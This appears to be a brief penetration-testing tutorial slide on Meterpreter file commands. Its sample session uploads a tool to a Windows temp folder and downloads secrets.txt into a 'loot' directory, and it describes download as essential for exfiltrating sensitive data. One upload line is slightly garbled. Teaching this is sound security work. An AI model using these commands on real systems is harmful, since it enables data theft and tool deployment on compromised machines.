Meterpreter Basics: File System Interaction
Navigating and manipulating files on the target system.
Meterpreter File Commands
meterpreter > ls

============
Mode      Size  Type  Last modified         Name

100666/rw-r--r-- 12345 file  2023-10-26 10:30:00 confidential.docx

meterpreter > upload /root/tools/tool.exe C:\Windows\Temp  ool.exe

meterpreter > download C:\Users\Admin\Documents\secrets.txt /root/loot/secrets.txt
Downloading: C:\Users\Admin\Documents\secrets.txt -> /root/loot/secrets.txt
Downloaded 54321 bytes in 5.43 seconds (9.9 KB/s)
Key File System Operations
  • •`ls`, `cd`, `pwd`: Standard commands for directory listing, changing, and printing the current working directory.
  • •`upload`: Transfers files from your attacking machine to the target. Essential for deploying tools or payloads.
  • •`download`: Retrieves files from the target system to your attacking machine. Crucial for exfiltrating sensitive data.
  • •Seamless Interaction: Meterpreter abstracts OS differences, allowing consistent file operations.
Common Mistake

Incorrectly specifying file paths (e.g., using Linux paths on Windows or vice-versa) leading to failed transfers.

Key Takeaway

Meterpreter's file system commands are intuitive and essential for moving data and tools between attacker and target.
